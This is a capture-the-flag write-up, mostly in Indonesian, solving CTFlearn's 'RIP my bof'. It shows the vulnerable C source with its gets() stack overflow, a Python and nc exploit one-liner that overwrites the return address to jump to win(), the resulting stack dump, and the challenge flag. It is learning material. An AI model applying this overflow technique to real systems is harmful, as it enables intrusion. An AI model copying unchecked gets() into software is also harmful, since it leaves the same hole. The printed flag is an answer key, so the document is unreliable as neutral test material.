# RIP my bof (Binary)
Okay so we have a bof, can we get it to redirect IP (instruction pointer) to something else?
<br>
If you get stuck liveoverflow covers you again!
<br>
nc thekidofarcrania.com 4902
# Solved
Cek source nya
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);

void win() {
  system("/bin/cat /flag.txt");
}

void vuln() {
  char padding[16];
  char buff[32];

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  vuln();
}
```
Tugas kita disini adalah mengeksekusi fungsi dari <b>win</b>, sebelumnya untuk mendapatkan address dari <b>win</b>
```console
$ objdump -D server | grep "win"
08048586 <win>:
```
Kemudian lakukan bufferoverflow sampai mengubah address dari <b>0x0804868b</b>
```console
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffbc24c0 | 00 00 00 00 00 00 00 00 |
0xffbc24c8 | 00 00 00 00 00 00 00 00 |
0xffbc24d0 | 00 00 00 00 00 00 00 00 |
0xffbc24d8 | 00 00 00 00 00 00 00 00 |
0xffbc24e0 | ff ff ff ff ff ff ff ff |
0xffbc24e8 | ff ff ff ff ff ff ff ff |
0xffbc24f0 | c0 85 74 f7 00 a0 04 08 |
0xffbc24f8 | 08 25 bc ff 8b 86 04 08 |
Return address: 0x0804868b
```
Ini perintah yang saya gunakan
```console
$ python -c 'print ("A" * 60) + "\x86\x85\x04\x08"' | nc thekidofarcrania.com 4902

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffbc24c0 | 00 00 00 00 00 00 00 00 |
0xffbc24c8 | 00 00 00 00 00 00 00 00 |
0xffbc24d0 | 00 00 00 00 00 00 00 00 |
0xffbc24d8 | 00 00 00 00 00 00 00 00 |
0xffbc24e0 | ff ff ff ff ff ff ff ff |
0xffbc24e8 | ff ff ff ff ff ff ff ff |
0xffbc24f0 | c0 85 74 f7 00 a0 04 08 |
0xffbc24f8 | 08 25 bc ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text:
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffbc24c0 | 41 41 41 41 41 41 41 41 |
0xffbc24c8 | 41 41 41 41 41 41 41 41 |
0xffbc24d0 | 41 41 41 41 41 41 41 41 |
0xffbc24d8 | 41 41 41 41 41 41 41 41 |
0xffbc24e0 | 41 41 41 41 41 41 41 41 |
0xffbc24e8 | 41 41 41 41 41 41 41 41 |
0xffbc24f0 | 41 41 41 41 41 41 41 41 |
0xffbc24f8 | 41 41 41 41 86 85 04 08 |
Return address: 0x08048586

CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
timeout: the monitored command dumped core
```
Flag : <b>CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}</b>
